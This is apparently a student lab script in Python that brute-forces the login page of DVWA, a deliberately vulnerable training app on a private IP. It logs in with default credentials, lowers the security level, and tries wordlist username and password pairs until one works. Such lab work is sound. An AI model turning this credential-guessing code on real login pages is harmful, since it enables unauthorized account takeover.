import requests
import time
import os

username_file = open("file/usernames.txt")
password_file = open("file/passwords.txt")

user_list = username_file.readlines()
pwd_list = password_file.readlines()

# Dati di configurazione
start_data = {
    'dvwa_url' : 'http://192.168.50.101/dvwa',  # URL di base di DVWA
    'username' : 'admin',  # Username per il login
    'password' : 'password'  # Password per il login
}

# Dato relativo al livello di sicurezza
desired_level = 'low'  # Può essere 'low', 'medium', 'high', o 'impossible'

# Funzione per effettuare il login
def login(session):
    login_url = f'{start_data['dvwa_url']}/login.php'
    login_data = {
        'username': start_data['username'],
        'password': start_data['password'],
        'Login': 'Login'
    }
    response = session.post(login_url, data=login_data)
    return 'Login failed' not in response.text

# Funzione per modificare il livello di sicurezza
def set_security_level(session, level):
    security_url = f'{start_data['dvwa_url']}/security.php'
    security_data = {
        'security': level,
        'seclev_submit': 'Submit'
    }
    response = session.post(security_url, data=security_data)
    return response.status_code == 200

def brute_force(sessione):

    dati = {
    'username': '',
    'password': '',
    'Login' : 'Login'
    }

    n_attempt = 0
    stopit = False
    for user in user_list:
        user =  user.rstrip()
        if stopit: break
        for pwd in pwd_list:
            pwd = pwd.rstrip()
            dati["username"] = user
            dati["password"] = pwd
            new_url = f'http://192.168.50.101/dvwa/vulnerabilities/brute/?username={dati["username"]}&password={dati["password"]}&Login={dati['Login']}#'  
            n_attempt+=1
            print(f"Combinazione N: {n_attempt}")
            response = sessione.get(new_url)
            if response.status_code == 200:
                if "Welcome to the password protected area admin" in response.text:
                    os.system("clear")
                    print(f"Login effettuato\nUser: {user} - Password: {pwd}")
                    end_time = time.time()
                    executio_time = round(start_time - end_time,2)
                    print(f"Numero tentativi: {n_attempt}")
                    print(f"Tempo di esecuzione: {executio_time} secondi")
                    stopit = True 
                    break
            else:
                print(f"Errore nel accedere alla pagina brute. Codice di stato: {response.status_code}")

start_time = time.time()

# Inizializza una sessione
with requests.Session() as session:
    # Effettua il login
    if login(session):
        print("Login effettuato con successo.")
        
        # Imposta il livello di sicurezza
        if set_security_level(session, desired_level):
            print(f"Livello di sicurezza impostato a: {desired_level}")
        else:
            print("Errore nell'impostare il livello di sicurezza.")
    else:
        print("Errore nel login.")
    print(brute_force(session))

